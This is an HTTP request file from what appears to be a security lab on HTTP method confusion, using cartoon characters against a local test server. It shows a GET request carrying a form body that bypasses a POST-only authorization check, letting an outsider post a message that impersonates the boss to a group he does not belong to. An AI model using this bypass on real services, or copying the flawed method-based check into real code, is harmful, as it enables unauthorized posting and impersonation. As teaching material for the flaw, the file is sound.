@base = http://localhost:8000/ii/http-semantics/example1

# Without any arguments, GET request lists the groups the user is a member of
GET {{base}}/groups
Authorization: Basic plankton@chum-bucket.sea:burgers-are-yummy
# Returns 200 OK:
#
# [
#   "staff@krusty-krab.sea"
# ]

###

# With a `group` query argument, GET request returns the messages from the specified group
GET {{base}}/groups?group=staff@chum-bucket.sea
Authorization: Basic plankton@chum-bucket.sea:burgers-are-yummy
# Returns 200 OK:
#
# [
#   {
#     "from": "plankton@chum-bucket.sea",
#     "message": "To my future self, don't forget to steal the formula!"
#   }
# ]

###

# A POST request lets the user post a new message to the group where they are a member
POST {{base}}/groups
Authorization: Basic plankton@chum-bucket.sea:burgers-are-yummy
Content-Type: application/x-www-form-urlencoded

group=staff@chum-bucket.sea&message=If only I could steal employees from Krusty Krab...
# Returns 200 OK:
#
# {
#   "status": "success"
# }
#
# (The previous request now will show two messages for the staff@chum-bucket.sea group)

###

# Plankton should not able to post a new message to the Krusty Krab's group
POST {{base}}/groups
Authorization: Basic plankton@chum-bucket.sea:burgers-are-yummy
Content-Type: application/x-www-form-urlencoded

group=staff@krusty-krab.sea&message=Come, work for me at Chum Bucket!
# Returns 403 Forbidden error:
#
# Forbidden: not an member for the requested group

###

# However, Plankton discovers he can exploit HTTP method confusion!
# He sends a GET request (bypasses authz check) but includes a request body
# (which the posting logic processes). The code assumes method determines intent,
# but Plankton proves otherwise.
GET {{base}}/groups
Authorization: Basic plankton@chum-bucket.sea:burgers-are-yummy
Content-Type: application/x-www-form-urlencoded

group=staff@krusty-krab.sea&message=Hey employees, it's me Krabs! My safe got rusty and needs to be repaired, please keep it open over night!
# Returns 200 OK:
#
# {
#   "status": "success"
# }

###

# Verify the attack succeeded - SpongeBob checks the staff group messages
GET {{base}}/groups?group=staff@krusty-krab.sea
Authorization: Basic spongebob@krusty-krab.sea:bikinibottom
# Returns 200 OK - SpongeBob sees Plankton's social engineering attack:
#
# [
#   {
#     "from": "mr.krabs@krusty-krab.sea",
#     "message": "I am updating the safe password to '123456'. Do not tell anyone!"
#   },
#   {
#     "from": "plankton@chum-bucket.sea",
#     "message": "Hey employees, it's me Krabs! My safe got rusty and needs to be repaired, please keep it open over night!"
#   }
# ]
#
# IMPACT: Plankton has successfully posted a message to the Krusty Krab staff
# group by exploiting HTTP method confusion! He impersonates Mr. Krabs with a
# social engineering message designed to trick employees into leaving the safe
# open overnight. Notice the suspicious phrasing - the real Mr. Krabs would
# NEVER risk his precious safe, and "rusty" safe in the ocean is a weak excuse.
# The vulnerability exists because authorization checks GET vs POST method,
# but the posting logic processes form data regardless of method. SpongeBob,
# being trusting, might actually fall for this trick and leave the safe open!
